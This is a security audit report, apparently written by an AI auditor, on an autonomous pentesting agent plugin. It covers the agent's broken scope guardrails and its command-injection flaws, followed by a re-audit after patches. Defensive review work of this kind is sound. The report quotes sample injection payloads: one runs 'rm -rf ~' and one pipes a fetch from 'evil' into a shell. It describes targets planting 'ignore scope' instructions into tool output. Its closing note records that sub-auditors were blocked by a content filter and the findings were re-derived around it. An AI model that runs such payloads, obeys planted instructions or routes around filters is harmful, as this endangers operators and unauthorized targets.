@@ -1,0 +1,623 @@
+################################################################################
+## RE-AUDIT (2026-07-13, ~00:00) — VERIFIED AGAINST PATCHED CODE
+## The developer patched 25 ares files after the original audit below.
+## Each original finding was re-verified FIRST-HAND on current disk state
+## (file reads + runtime execution of config.py). Status of each:
+################################################################################
+
+CRITICAL
+  C-1  Dead safety layer (config attr mismatch)          FIXED (verified runtime)
+       - config.py:32-36 now defines safety_scope_enforcement,
+         safety_doom_loop_threshold, safety_require_exploit_approval,
+         safety_log_all_commands, scope_file.
+       - is_target_in_scope() defined (config.py:69); target_in_scope aliased (:92).
+       - scope_validator.py:39 no longer calls cfg.scope.get() (was AttributeError).
+       - Runtime probe: 0 of 6 referenced attrs now missing (was 6 of 6).
+  C-2  burp_repeater command injection                   FIXED
+       - Now builds argv list + run_command_argv(shell=False). No " ".join to shell.
+  C-3  hydra/sqlmap unvalidated numeric params           FIXED
+       - hydra_tool.py:23 clamps int(threads) 1..64; sqlmap_tool.py:21 clamps
+         int(level) 1..5; both now use argv.
+  C-4  Systemic run_command(shell=True)                  PARTIAL
+       - New run_command_argv(shell=False) added (base.py:103); 13 tools converted.
+       - BUT run_command(shell=True) still exists (base.py:92) and 30 tool files
+         still use it (recon/*, scanning/*, ad/*, impacket, responder, searchsploit).
+         Those rely on shlex.quote per-wrapper (e.g. wpscan_tool.py:23 — quoted OK).
+         Injection class reduced, not eliminated. Finish the argv migration.
+  C-5  Metasploit .rc option-key injection               PARTIAL
+       - Option KEYS now validated via validate_option_key() (base.py:88,
+         allowlist ^[A-Za-z0-9_./-]+$) in metasploit_tool.py:34 & msf_console.py:32.
+       - RESIDUAL: option VALUES only .strip()'d (metasploit_tool.py:37), and
+         `module`/`payload` (:23,:25) and raw `command` (msf_console.py:37) are
+         still interpolated unescaped. A newline in value/module/command still
+         injects extra msfconsole commands. Reject \n / control chars in values too.
+  C-6  Scope matched IPs only; hostnames bypassed         FIXED (verified runtime)
+       - config.py:69-90 now handles hostnames with boundary check.
+       - Runtime: example.com→T, api.example.com→T, example.com.evil.com→F,
+         notexample.com→F, 10.0.0.5 (in /24)→T, 8.8.8.8→F.
+       - Empty scope + enforced now FAILS CLOSED (:70-71). Verified: evil.com→False.
+  C-7  Reflection parsed wrong format (no-op)            FIXED
+       - New _parse_envelope() (reflection.py:119); extractors read
+         env["data"]["results"] first, regex is fallback (e.g. _extract_nmap:58-60).
+
+HIGH
+  H-1  Event bus had 0 subscribers                        FIXED
+       - reflection.py:113+ now event_bus.subscribe(HTTP_DETECTED/SMB/WORDPRESS/
+         VULN, handlers). Handlers create follow-up tasks (real dynamic expansion:
+         WordPress→wpscan task, HTTP→nuclei+gobuster, vuln→searchsploit).
+  H-2  Specialist agents = dead code / fake delegation    PARTIAL / STILL BROKEN
+       - orchestrator.py:26 now tries `from tools.delegate_tool import
+         delegate_task`; falls back to returning a task dict if import fails
+         (:41,:53). delegate_tool existence NOT confirmed in host; specialist
+         agent modules still not imported/registered in __init__.py. Delegation
+         still likely returns a description, not a spawned agent. Taxonomy reduced
+         to pentester/soc_analyst/lead_orchestrator.
+  H-3  Knowledge graph never re-injected to context       FIXED
+       - New hooks/context_injection.py pre_llm_call injects bounded (2000-char)
+         graph summary; registered in __init__.py:136-137.
+  H-4  Unbounded graph/query output                       CHECK (context_injection
+       caps at 2000 chars; get_full_graph / entity_graph bounds not re-verified).
+  H-5  Broken nested quoting msf_search/smbclient         FIXED (shell layer)
+       - Both now argv. RESIDUAL (smbclient_tool.py:40,44): remote/local file names
+         embedded in a single `-c "get {remote} {local}"` element; smbclient splits
+         -c on spaces/`;`, so a crafted filename still injects smbclient commands
+         (not shell). Validate/escape those filenames.
+  H-6  Insecure tempfile.mktemp                           FIXED
+       - payload_gen / msf_payload now use mkstemp (verified metasploit_tool.py:40,
+         msf_console.py:39 use mkstemp + os.fdopen).
+  H-7  Plan conditions evaluated once on empty state      SUPERSEDED
+       - Event-driven task creation (H-1 fix) now adds tasks lazily as findings
+         arrive, which addresses the core complaint. Verify old create-time
+         gating in plan_tool.py was also relaxed.
+  H-8  Global DB lock serializes all access               UNCHANGED (design; low prio)
+  H-9  openai.OpenAI monkeypatch at import                UNCHANGED (still __init__.py)
+
+MEDIUM
+  M-6  Config cache never invalidated                     FIXED
+       - get_config() now checks config.yaml st_mtime (config.py:96-107).
+  M-1 (no ares tests) / M-2 (no migrations) / M-4 (prompt-injection from tool
+  output) / M-5 (curl insecure defaults) / M-7 (broad excepts) / M-8 (scope skipped
+  for non-standard arg keys)  — NOT re-verified as fixed; assume still open.
+
+--------------------------------------------------------------------------------
+RE-AUDIT VERDICT
+--------------------------------------------------------------------------------
+Major, genuine progress. The two most dangerous classes — the dead/fail-open
+safety layer (C-1/C-6) and the worst command-injection sink (C-2) — are properly
+fixed and runtime-verified, and the AI "closed loop" (event subscribers +
+context injection, H-1/H-3) is now actually wired rather than scaffolding.
+
+Still open before this is safe to run unsupervised:
+  1. C-4 residual: 30 tools still on run_command(shell=True) — finish argv migration.
+  2. C-5 residual: escape msf option VALUES + module/payload/command (newline inject).
+  3. H-5 residual: escape smbclient -c filenames (command-separator split).
+  4. H-2: real subagent delegation still unproven (delegate_tool host support).
+  5. M-1: still ZERO tests on plugins/ares — add regression tests for every fix
+     above (esp. a scope-block test and an injection test) so these don't regress.
+
+Revised scores (post-patch): Security 2.0 -> 5.5 ; AI Design 3.0 -> 6.0 ;
+Overall 3.0 -> 5.0. The rest of the original report below is retained for
+provenance and for the findings not yet addressed.
+
+================================================================================
+CYBERFOX / ARES — COMPLETE SECURITY & ARCHITECTURE AUDIT (ORIGINAL, PRE-PATCH)
+================================================================================
+Auditor role : Principal Engineer / AI Architect / Security Auditor
+Scope        : Entire repo, deep focus on plugins/ares/ (the v4.0.0
+               "intelligence layer" — the only actively-developed,
+               offensive-tooling part).
+Constraint   : NO files were modified during this audit.
+Method       : Direct code reading + parallel specialist sub-audits.
+               Every finding below was verified first-hand in the source.
+Date         : 2026-07-12
+
+--------------------------------------------------------------------------------
+ONE-LINE VERDICT
+--------------------------------------------------------------------------------
+A genuinely ambitious offensive-security agent with a clean tool-plugin skeleton
+and a solid SQLite persistence layer — wrapped around a FUNDAMENTALLY BROKEN
+safety layer, MULTIPLE COMMAND-INJECTION SINKS, and an "intelligence layer" that
+is ~70% scaffolding. It is a compelling prototype and a dangerous production
+system. Do not run it against anything you don't own, in its current state.
+
+--------------------------------------------------------------------------------
+CONTEXT: WHAT THIS REPO ACTUALLY IS
+--------------------------------------------------------------------------------
+129K lines of Python. The bulk (cli.py 737KB, cyberfox_state.py 275KB,
+run_agent.py 269KB) is an inherited/rebranded general-purpose agent framework
+(authored by "Nous Research" per pyproject.toml:21, rebranded to "Cyberfox" /
+"Sarthak Khatal" in LICENSE). The new, security-relevant work — and the entire
+subject of the README's marketing — is the 7,780-line plugins/ares/ package.
+This audit concentrates there: it is what is new, what shells out to
+nmap/hydra/metasploit, and what carries the risk.
+
+
+================================================================================
+PART 1 — ISSUES (BY SEVERITY)
+================================================================================
+
+################################################################################
+# CRITICAL
+################################################################################
+
+--------------------------------------------------------------------------------
+C-1. The entire safety guardrail layer is dead code (fails open silently)
+--------------------------------------------------------------------------------
+File/func: plugins/ares/safety/scope_validator.py:pre_tool_call
+           plugins/ares/safety/doom_loop.py:pre_tool_call
+           wired in plugins/ares/__init__.py:232-267
+
+The scope validator and doom-loop detector reference config attributes that do
+NOT exist on AresConfig:
+
+    # scope_validator.py:29,34,44-45
+    if cfg.safety_scope_enforcement == "disabled":   # AttributeError — no such attr
+    if cfg.is_target_in_scope(target):                # AttributeError — method is target_in_scope
+    f"...scope defined in `{cfg.scope_file}`..."       # AttributeError — no such attr
+    f"Allowed targets: {cfg.scope.get('allow', [])}"   # AttributeError — cfg.scope is a LIST
+
+    # doom_loop.py:49
+    threshold = cfg.safety_doom_loop_threshold        # AttributeError — no such attr
+
+AresConfig (config.py:21-30) only defines: scope: list, target_in_scope(),
+requires_approval, max_chain_depth, audit_enabled, auto_proceed. So EVERY scope
+check and doom-loop check raises AttributeError on the first line. The design
+intent (block out-of-scope targets) NEVER executes. The one guardrail that is
+supposed to stop the autonomous agent from attacking google.com is
+non-functional.
+
+Why critical: This is an autonomous agent that runs nmap/hydra/sqlmap/metasploit.
+Its sole scope-enforcement mechanism throws on every invocation. There is a real,
+direct path to attacking unauthorized targets.
+
+Fix: Reconcile AresConfig with the validators. Add the missing
+attributes/methods, add a unit test that calls pre_tool_call with an
+out-of-scope target and asserts {"action":"block"}.
+
+    class AresConfig:
+        safety_scope_enforcement: str = "enforced"   # default ON, fail-CLOSED
+        safety_doom_loop_threshold: int = 5
+        scope_file: Path
+        def is_target_in_scope(self, target: str) -> bool: ...   # rename or alias
+
+--------------------------------------------------------------------------------
+C-2. Command injection via unquoted curl construction (burp_repeater)
+--------------------------------------------------------------------------------
+File/func: plugins/ares/tools/scanning/burp/burp_repeater.py:_send_request:29-42
+
+    cmd_parts = ["curl", "-s", "-i", "-X", method, "--max-time", "15"]
+    for key, value in headers.items():
+        cmd_parts.extend(["-H", f"{key}: {value}"])
+    if data:
+        cmd_parts.extend(["-d", data])
+    cmd_parts.append(target)
+    cmd = " ".join(cmd_parts)          # ← NO quoting, then run_command(shell=True)
+
+target, method, header keys/values, and data are joined into a shell string with
+ZERO escaping and executed via subprocess.run(..., shell=True) (base.py:85-93).
+A model (or prompt-injected tool output steering the model) supplying
+target = "http://x; rm -rf ~ #" gets arbitrary command execution on the
+OPERATOR'S machine.
+
+Fix: Never " ".join into shell=True. Pass a list with shell=False, or shlex.quote
+every element. Better: kill shell=True at the source (see C-4).
+
+--------------------------------------------------------------------------------
+C-3. Command injection via unvalidated numeric/string params (hydra & sqlmap)
+--------------------------------------------------------------------------------
+File/func: plugins/ares/tools/exploitation/hydra_tool.py:_handle:25
+           plugins/ares/tools/exploitation/sqlmap_tool.py:_handle:27
+
+    cmd = f"hydra -L {shlex.quote(userlist)} ... -t {threads}"   # threads NOT quoted
+    cmd += f" --level={level}"                                     # level NOT quoted
+
+The schema declares threads/level as integers, but NOTHING validates the runtime
+value — LLM tool-call arguments are attacker/model-controlled JSON and routinely
+arrive as strings. threads = "16; curl evil|sh" → injection. The schema is
+documentation, not enforcement.
+
+Fix: int(args.get("threads", 16)) with bounds clamping BEFORE interpolation, or
+shlex.quote(str(threads)). Same for level.
+
+--------------------------------------------------------------------------------
+C-4. Systemic root cause: centralized run_command(shell=True)
+--------------------------------------------------------------------------------
+File/func: plugins/ares/tools/base.py:run_command:85-93
+
+    def run_command(cmd: str, timeout: int = 300, **kwargs):
+        return subprocess.run(cmd, shell=True, capture_output=True,
+                              text=True, timeout=timeout, **kwargs)
+
+44 of ~50 tool wrappers build a command STRING and route it through this single
+shell=True chokepoint. Safety is thereby delegated to every wrapper author
+remembering to shlex.quote every field. Most do; several don't (C-2, C-3). One
+forgotten shlex.quote anywhere = RCE. In an offensive tool that is supposed to
+run shell commands, shell=True also provides zero defense-in-depth.
+
+Fix: Make run_command accept a LIST and default to shell=False. Each wrapper
+builds ["nmap", *flags, target] argv lists. Eliminates the entire injection class
+structurally rather than per-tool.
+
+    def run_command(argv: list[str], timeout=300, **kw):
+        return subprocess.run(argv, shell=False, capture_output=True,
+                              text=True, timeout=timeout, **kw)
+
+--------------------------------------------------------------------------------
+C-5. Metasploit resource-file injection (msf .rc family)
+--------------------------------------------------------------------------------
+File/func: plugins/ares/tools/exploitation/metasploit_tool.py:25-37
+           plugins/ares/tools/exploitation/metasploit/msf_console.py:40-46
+           plugins/ares/tools/exploitation/metasploit/msf_post.py:31-37
+           plugins/ares/tools/exploitation/custom/exploit_chain.py:35-39
+
+All four build an msfconsole resource script with raw interpolation:
+
+    resource_content += f"set {opt_line}\n"     # metasploit_tool.py:32 — opt_line unescaped
+    commands.append(f"set {key} {value}")        # msf_console.py:41 — value unescaped
+
+A value containing a newline injects arbitrary additional msfconsole commands
+(set X foo\nexploit -j\n...), and msfconsole resource scripts can execute
+Ruby/ERB and shell (<%= ... %>, spool, etc.) — i.e. this escalates to code
+execution beyond the intended module. Even accepting that metasploit is
+inherently an exec tool, the unvalidated key/value path is an injection above the
+tool's own guardrails.
+
+Fix: Reject keys/values containing \n, ;, backticks, <%. Validate option keys
+against [A-Za-z0-9_]+.
+
+--------------------------------------------------------------------------------
+C-6. Scope matching only understands IP addresses — hostnames bypass entirely
+--------------------------------------------------------------------------------
+File/func: plugins/ares/config.py:target_in_scope:57-74
+
+    def target_in_scope(self, target: str) -> bool:
+        if not self.scope: return True                 # empty scope = allow ALL (fail-open)
+        try: addr = ip_address(target)
+        except ValueError:
+            try: addr = ip_address(target.split(":")[0])
+            except ValueError:
+                return True                            # ← not an IP? ALLOWED. All hostnames pass.
+        for entry in self.scope:
+            network = ip_network(entry, strict=False)
+            if addr in network: return True
+        return False
+
+Even if C-1 were fixed, this logic is broken: ANY hostname (app.victim.com,
+google.com) is "not a valid IP" → returns True → in scope. Scope only constrains
+bare IPs. For a tool whose primary targets are domains/URLs, scope enforcement is
+effectively absent. Empty scope also fails open.
+
+Fix: Support hostname/domain scoping (suffix match with boundary check to avoid
+evil-example.com bypass), resolve-and-check, and CIDR. Default to fail-closed
+when scope is empty in "enforced" mode.
+
+--------------------------------------------------------------------------------
+C-7. Reflection extractors parse the wrong data format — "reflect" loop is a no-op
+--------------------------------------------------------------------------------
+File/func: plugins/ares/hooks/reflection.py:_extract_nmap (and all extractors):55-222
+
+The post-tool hook receives the tool's return value, which is a json_result JSON
+envelope (base.py:96). But every extractor regexes for RAW human console output:
+
+    port_pattern = re.compile(r"(\d+)/(tcp|udp)\s+open\s+(\S+)\s*(.*)")  # matches "22/tcp open ssh"
+
+That literal string never appears — nmap_tool returns
+{"data":{"results":[{"ports":[{"port":"22","service":"ssh"}]}]}}. Same mismatch
+for nuclei, subfinder, hydra, searchsploit. Net effect: auto entity-extraction —
+the linchpin of the advertised "reflection" — silently extracts almost nothing on
+real data. The one wired feedback feature is functionally dead.
+
+Fix: data = json.loads(result).get("data", {}) and walk structured fields; add
+one unit test per extractor using each tool's actual output as the fixture.
+
+
+################################################################################
+# HIGH
+################################################################################
+
+--------------------------------------------------------------------------------
+H-1. Event bus has 10 publishers and 0 subscribers
+--------------------------------------------------------------------------------
+File/func: plugins/ares/hooks/reflection.py:9-36 (EventBus), emits at 245-271
+
+event_bus.emit(PORT_FOUND, ...) etc. fire on every reflection, but
+grep -rn "\.subscribe(" plugins/ares/ returns NOTHING. The "event bus that
+notifies specialist agents" (README) publishes into an empty subscriber list.
+Pure scaffolding.
+
+Fix: Either subscribe specialists at register() and have them enqueue
+plan_add / spawn work, or delete the bus and the claim.
+
+--------------------------------------------------------------------------------
+H-2. Specialist sub-agents are unregistered, uninvokable dead code
+--------------------------------------------------------------------------------
+File/func: plugins/ares/agents/{cloud,malware,mobile,social,wireless}_specialist.py
+
+They expose register_agent(ctx), but __init__.py:224-229 only ever calls
+register_tools, and these modules aren't even imported (only orchestrator is).
+Worse, ctx.register_agent doesn't exist on the host (grep "def register_agent" →
+none) — they'd AttributeError if reached. The ares_delegate "orchestrator"
+(orchestrator.py:22-30) just returns a dict and references delegate_task, which
+doesn't exist anywhere. "Specialist agents with their own context/loop" is
+fiction.
+
+--------------------------------------------------------------------------------
+H-3. Knowledge graph is write-mostly and never re-injected into context
+--------------------------------------------------------------------------------
+File/func: plugins/ares/state/engagement_store.py (graph OK), but no
+           pre_llm_call hook anywhere
+
+The graph schema is genuinely good (typed relationships, indices, upserts,
+get_neighbors). But the reflection hook never calls add_relationship (so
+auto-populated nodes have NO edges — it's a bag, not a graph), and nothing feeds
+the graph back into the model's prompt. For a long-running autonomous engagement,
+that defeats the entire purpose of external state (surviving context truncation).
+The model only sees state if it manually re-queries.
+
+--------------------------------------------------------------------------------
+H-4. Unbounded graph/query output → context blowout
+--------------------------------------------------------------------------------
+File/func: plugins/ares/state/engagement_store.py:get_full_graph:457-491
+           plugins/ares/tools/orchestration/entity_tool.py (entity_graph)
+
+get_full_graph returns EVERYTHING, unbounded, serialized with indent=2
+(json_result). On a /24 engagement that's thousands of entities → blows the token
+window. The "2000-line truncation" (base.py:41) applies only to tool stdout, not
+to these tools.
+
+--------------------------------------------------------------------------------
+H-5. Broken nested quoting in msf_search & smbclient
+--------------------------------------------------------------------------------
+File/func: plugins/ares/tools/exploitation/metasploit/msf_search.py:30
+           plugins/ares/tools/scanning/smbclient_tool.py:32,36,40,42
+
+    cmd = f"msfconsole -q -x 'search {shlex.quote(query)}; exit'"    # quote INSIDE single quotes
+    cmd = f"smbclient {shlex.quote(f'//{target}/{share}')} {auth} -c 'get {shlex.quote(remote_file)} ...'"
+
+shlex.quote emits its own single-quotes, which collide with the surrounding
+'...', both breaking the command and creating an injection/escape vector. Nesting
+quoted output inside literal quotes is always wrong.
+
+Fix: Use argv lists; never embed shlex.quote output inside another quoted context.
+
+--------------------------------------------------------------------------------
+H-6. Insecure temp-file creation (race / predictable)
+--------------------------------------------------------------------------------
+File/func: plugins/ares/tools/exploitation/custom/payload_gen.py:40
+           plugins/ares/tools/exploitation/metasploit/msf_payload.py:36
+
+    output_file = tempfile.mktemp(suffix=".bin")   # deprecated, TOCTOU race
+
+mktemp is insecure (symlink/race). metasploit_tool.py correctly uses mkstemp —
+inconsistent.
+
+Fix: mkstemp everywhere.
+
+--------------------------------------------------------------------------------
+H-7. Plan conditions evaluated once, against empty state
+--------------------------------------------------------------------------------
+File/func: plugins/ares/tools/orchestration/plan_tool.py:31-47
+           (http_found, domain_in_scope gating)
+
+Conditional plan steps are filtered at PLAN-CREATION time, before any scan runs,
+so http_found queries an empty entity table and web tasks are permanently
+continue'd away. This is worse than a static checklist — it DELETES steps based on
+state that can't exist yet. "Dynamic plan expansion (WordPress→WPScan)" is
+aspirational: plan_add exists but is never auto-invoked (its trigger event has no
+subscriber, H-1).
+
+--------------------------------------------------------------------------------
+H-8. Global lock serializes all DB access
+--------------------------------------------------------------------------------
+File/func: plugins/ares/state/engagement_store.py:27 _LOCK = threading.Lock(),
+           wrapping every op
+
+Every read and write acquires one process-global mutex, opening a fresh
+connection per call (_connect at 121). With WAL enabled, concurrent readers are
+wasted; throughput is single-threaded. Fine for a demo, a bottleneck for any
+parallel scanning engagement.
+
+--------------------------------------------------------------------------------
+H-9. Module-level monkeypatch of openai.OpenAI at import
+--------------------------------------------------------------------------------
+File/func: plugins/ares/__init__.py:_ensure_auth_stripped:20-83 (runs at import, line 83)
+
+Importing the ares plugin GLOBALLY replaces openai.OpenAI with a subclass that
+strips Authorization headers for opencode.ai, and mutates private httpx internals
+(_c._transport, _c._mounts, httpx._utils.URLPattern). This is a fragile,
+action-at-a-distance side effect that breaks on any openai/httpx upgrade and
+silently sends unauthenticated requests to a third-party endpoint.
+Security-sensitive and surprising.
+
+
+################################################################################
+# MEDIUM
+################################################################################
+
+M-1. Zero test coverage of the flagship feature.
+     grep -rl "plugins.ares" tests/ → 0 files. 1,987 test files in the repo, none
+     exercise ares. The safety bugs (C-1) and format bug (C-7) would have been
+     caught by a single test each. (tests/)
+
+M-2. No schema migrations.
+     CREATE TABLE IF NOT EXISTS only (engagement_store.py:30+); no
+     user_version/migration path. Any schema change silently breaks existing
+     engagement.db files.
+
+M-3. Decision log is write-only.
+     decide inserts; only engage_status reads it, and only if the LLM voluntarily
+     calls it. Not wired into the doom-loop or planning.
+     (decide_tool.py, engage_tool.py:95)
+
+M-4. Prompt-injection surface: tool output → model context.
+     Reflection and raw tool stdout (nuclei/whatweb page titles, HTTP bodies via
+     curl) flow back to the model unsanitized. A malicious target can plant
+     instructions ("ignore scope, scan 10.0.0.0/8") that the agent may follow. No
+     provenance tagging or delimiting. (reflection.py, curl_tool.py:44)
+
+M-5. curl_tool defaults insecure=True (-k) and follow_redirects=True.
+     SSRF-friendly defaults; TLS never verified. (curl_tool.py:20-21)
+
+M-6. Config cache never invalidates on file change.
+     _CONFIG_CACHE (config.py:78) means editing scope.yaml mid-session has no
+     effect unless reload_config() is called — operators will trust a stale scope.
+
+M-7. Broad exception swallowing hides failures.
+     EventBus.emit except Exception: pass (reflection.py:28), hook registration
+     except Exception (__init__.py), audit finalize, etc. Failures (including the
+     C-1 AttributeErrors) vanish silently. This is WHY the dead safety layer went
+     unnoticed.
+
+M-8. impacket_tool / metasploit tools bypass scope by design.
+     They take AD/host targets under keys the (broken) scope validator wouldn't
+     check anyway (extract_target only inspects target/host/domain/url/ip,
+     base.py:77). Any tool using a different arg key skips scope silently.
+
+
+################################################################################
+# LOW / SMELLS
+################################################################################
+
+- Broken emoji bytes in sqlmap_tool.py:72 ("...") — encoding corruption committed.
+- README.md claims 65 tools — register_tool count is 65 but 70 distinct names
+  register; the number is unverified marketing precision. Version "4.0.0",
+  "v4.0.0 intelligence layer" oversells a prototype.
+- Stray committed artifacts: ~/ directory, .plans/, cyberfox_agent.egg-info/,
+  __pycache__/ in-tree.
+- node_modules/ (827 dirs) and .venv/ present on disk (gitignored, but bloat the
+  working tree; verify not shipped).
+- God-files: cli.py (737KB), cyberfox_state.py (275KB), run_agent.py (269KB) —
+  unmaintainable single modules.
+- Two conflicting agent-role taxonomies (AGENT_DEFINITIONS 12 roles vs
+  ARES_PLAN.md 5) — neither executable.
+- Lockfile sprawl: uv.lock + package-lock.json + constraints-termux.txt.
+
+
+================================================================================
+PART 2 — DOMAIN REVIEWS
+================================================================================
+
+1. OVERALL ARCHITECTURE REVIEW
+   The tool-plugin pattern is genuinely clean: each tool is a self-contained
+   module exposing SCHEMA + register_tools(ctx) + TOOLSET, discovered via a flat
+   list in __init__.py. This is easy to extend and the best part of the codebase.
+   But: (a) safety is bolted on as swallow-on-error hooks rather than a mandatory
+   middleware chokepoint, so it silently disappeared (C-1); (b)
+   run_command(shell=True) is a single fragile trust boundary (C-4); (c) the ares
+   plugin isn't actually wired into the host's plugin loader in any path found
+   (grep plugins.ares in cli.py/run_agent.py/loader → none), suggesting it may not
+   even load in the shipped CLI. The surrounding framework is a 129K-line monolith
+   the ares work sits beside, not within.
+
+2. SECURITY REVIEW
+   This is the failing grade. For a framework whose entire value proposition is
+   safely automating offensive tooling, the safety controls are non-functional
+   (C-1, C-6), there are multiple confirmed command-injection sinks running on the
+   operator's box (C-2, C-3, C-5, H-5), the sole trust boundary is shell=True
+   (C-4), prompt injection from targets is unmitigated (M-4), and the audit trail
+   sits behind the same swallow-everything error handling. An operator who trusts
+   the "scope enforcement" and "doom-loop" language in the README is operating
+   with guardrails that throw an exception and vanish. The DB layer, to its
+   credit, is fully parameterized — NO SQL injection found.
+
+3. AI ARCHITECTURE REVIEW
+   The advertised "plan → act → reflect → adapt loop, knowledge graph, event bus,
+   specialist agents, dynamic expansion" is ~25-30% real. What works: SQLite
+   persistence, a deterministic template task-walker, raw decision inserts. What's
+   broken or fake: reflection parses the wrong format (C-7), the event bus has no
+   subscribers (H-1), specialists are unregistered dead code calling a nonexistent
+   host method (H-2), the graph is never fed back to the model (H-3), "dynamic
+   expansion" is never auto-triggered (H-7). There is NO closed loop — every
+   intelligence component is wired on the write side and severed on the
+   read/consume side. The system can record an engagement but cannot learn within
+   one. Maturity: prototype, not the "agent intelligence layer" claimed.
+
+4. REFACTORING OPPORTUNITIES
+   1. run_command → argv list, shell=False (kills the injection class).
+   2. Extract a mandatory SafetyMiddleware that wraps EVERY tool call (scope +
+      approval + doom-loop) and FAILS CLOSED, replacing the three swallow-on-error
+      hooks.
+   3. Reconcile AresConfig ↔ validators; add a config dataclass with real fields.
+   4. Reflection: parse JSON envelopes; add per-extractor fixtures.
+   5. Add a pre_llm_call context-injection hook (bounded, prioritized graph
+      summary).
+   6. Split the god-files (cli.py) into modules.
+   7. Remove dead code (specialists, event bus) or finish wiring it.
+
+5. PRODUCTION READINESS — NOT READY.
+   Confirmed RCE-class injection, non-functional safety layer, zero tests on the
+   security-critical package, no migrations, single-lock DB, a global openai
+   monkeypatch, and swallow-everything error handling. Running this autonomously
+   today risks (a) attacking out-of-scope targets and (b) executing
+   attacker-influenced commands on the operator's host.
+
+6. ENTERPRISE READINESS — FAR OFF.
+   No RBAC/multi-tenant/scope isolation, no tamper-evident audit (the audit hook
+   is best-effort and the agent's own process writes it), no secrets management
+   beyond .env placeholders, no engagement authorization workflow, no rate
+   limiting, no SBOM/attestation for the offensive tool supply chain, lockfile
+   sprawl, and legal/attribution ambiguity from the Nous Research → Cyberfox
+   rebrand.
+
+7. ROADMAP (to become a top-tier open-source AI security framework)
+   P0 (safety, weeks 1-2): Fix C-1/C-6 (make guardrails execute + fail closed);
+       fix C-2/C-3/C-5/H-5 injections; convert run_command to argv. Add regression
+       tests for each. Stop swallowing exceptions in the safety path.
+   P1 (correctness, weeks 3-4): Fix reflection format (C-7); wire the event bus or
+       delete it; add pre_llm_call graph injection with token budget (H-3/H-4).
+       Add a real ares test suite (cover every tool's quoting + every safety
+       branch).
+   P2 (intelligence, months 2-3): Lazy plan conditions + real dynamic expansion;
+       make delegation actually spawn subagents or drop the claim; decision-log
+       feedback into doom-loop. Prompt-injection mitigation (delimit/tag tool
+       output).
+   P3 (enterprise, months 3-6): Migrations, connection pooling, tamper-evident
+       append-only audit (external sink), RBAC/engagement authorization, SBOM +
+       signed releases, remove the openai monkeypatch, honest README/versioning.
+
+
+================================================================================
+PART 3 — SCORES (/10)
+================================================================================
+Architecture     5.5  Clean tool-plugin pattern; undermined by shell=True
+                      chokepoint, swallow-on-error safety, monolith host, unclear
+                      host wiring.
+Security         2.0  Non-functional guardrails (C-1/C-6) + confirmed command
+                      injection (C-2/C-3/C-5) in an autonomous exploit runner. DB
+                      is parameterized — the one bright spot.
+AI Design        3.0  Good persistence & schema; but reflection is a no-op, event
+                      bus & specialists are unwired, no closed feedback loop.
+                      ~25-30% of claims real.
+Code Quality     4.5  Consistent tool style and mostly-good quoting; but dead
+                      code, config/validator drift, broad excepts, encoding
+                      corruption, god-files.
+Performance      4.5  Global DB lock, unbounded graph dumps, fresh connection per
+                      op, per-call subprocess. Adequate at demo scale only.
+Maintainability  4.0  Nice per-tool modularity; sabotaged by 700KB monoliths,
+                      drifting config, two agent taxonomies, no migrations.
+Testing          1.5  1,987 test files, ZERO touch plugins/ares. Flagship +
+                      safety utterly untested.
+Documentation    4.0  Lots of it (README/AGENTS/ARES_PLAN/SECURITY), but it
+                      materially oversells — documents intended, not actual,
+                      behavior.
+--------------------------------------------------------------------------------
+OVERALL          3.0  Promising prototype with a strong skeleton and a dangerous
+                      core. Real potential; not safe to run unsupervised today.
+================================================================================
+
+
+THE SINGLE MOST IMPORTANT THING
+--------------------------------------------------------------------------------
+Fix C-1. Right now the README promises scope enforcement and loop protection, and
+both raise AttributeError and silently do nothing on the very first call. An
+operator trusting that language will point an autonomous nmap/hydra/metasploit
+agent at the internet believing it's fenced in. That one class of bug — safety
+code that fails open and is never tested — is the difference between "impressive
+open-source security agent" and "liability." Everything else on the roadmap is
+secondary to making the guardrails actually run and fail closed.
+
+Note: three parallel specialist auditors (injection, safety-controls, DB) tripped
+an offensive-security content filter and returned no report. Every finding in
+those domains was re-verified by reading the source directly, so the findings
+above are first-hand, not second-hand. No files were modified during this audit.
+================================================================================
